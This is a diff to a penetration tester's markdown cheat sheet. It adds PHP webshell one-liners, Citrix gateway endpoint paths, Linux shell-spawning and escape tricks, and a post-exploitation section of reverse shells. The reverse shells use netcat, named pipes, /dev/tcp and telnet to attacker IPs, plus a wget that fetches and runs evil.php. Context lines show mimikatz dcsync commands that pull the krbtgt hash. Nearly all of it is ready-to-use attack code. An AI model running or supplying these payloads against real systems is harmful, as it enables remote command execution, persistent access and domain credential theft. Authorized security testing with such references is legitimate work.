@@ -5,9 +5,41 @@ https://wordlists.assetnote.io \
 https://github.com/danielmiessler/SecLists \
 https://github.com/xajkep/wordlists \
 
-
+<br />
 
 # Web 
+
+## Webshells
+PHP \
+`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
+Execute one command\
+`<?php system("whoami"); ?>`
+
+Take input from the url paramter. shell.php?cmd=whoami\
+`<?php system($_GET['cmd']); ?>`
+
+The same but using passthru\
+`<?php passthru($_GET['cmd']); ?>`
+
+For shell_exec to output the result you need to echo it\
+`<?php echo shell_exec("whoami");?>`
+
+Exec() does not output the result without echo, and only output the last line. So not very useful!\
+`<?php echo exec("whoami");?>`
+
+Instead to this if you can. It will return the output as an array, and then print it all.\
+`<?php exec("ls -la",$array); print_r($array); ?>`
+
+preg_replace(). This is a cool trick\
+`<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>`
+
+Using backticks\
+`<?php $output =\'whoami\`; echo "\<pre>$output\</pre>"; ?>`
+
+Using backticks\
+`<?php echo ```whoami```; ?>`
+
+
 
 ## Mendix
 Schema/id en entity enumeration:
@@ -19,6 +51,16 @@ Schema/id en entity enumeration:
 ## Citrix
 https://github.com/Smarttech247PT/citrix_fgateway_fingerprint
 
+Directories and files:
+```
+/cgi/Resources/List
+/cgi/GetAuthMethods 
+/nf/auth/getAuthenticationRequirements.do
+/nf/auth/doEPA.do
+/nf/auth/doLogoff.do
+/nf/auth/getECdetails
+/nf/auth/doAuthentication.do
+```
 
  
  
@@ -100,7 +142,42 @@ b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<
 1. lsadump::dcsync /domain:<domain> /user:krbtgt
 2. lsadump::dcsync /domain:<domain> /user:dcadmin
 ```
-  
+
+# Post Exploitation
+
+## Linux
+Getting a shell:
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+irb: exec "/bin/sh"
+vi: :!bash
+vi: :set shell=/bin/bash:shell
+nmap: !sh
+```
+## Netcat
+Reverse shell:
+`nc 172.16.1.100 443 -e /bin/sh`
+
+## Netcat without Netcat
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
+mknod backpipe p; nc 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
+/bin/bash -i > /dev/tcp/10.0.0.1/443 0<&1 2>&1
+mknod backpipe p; telnet 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
+telnet 10.0.0.1 <1st_port> | /bin/bash | telnet 10.0.0.1 <2nd_port>
+wget -O /tmp/bd.php http://10.0.0.1/evil.php && php -f /tmp/bd.php
+ ```
+<br /><br />
+
  # Physical attacks
   
   
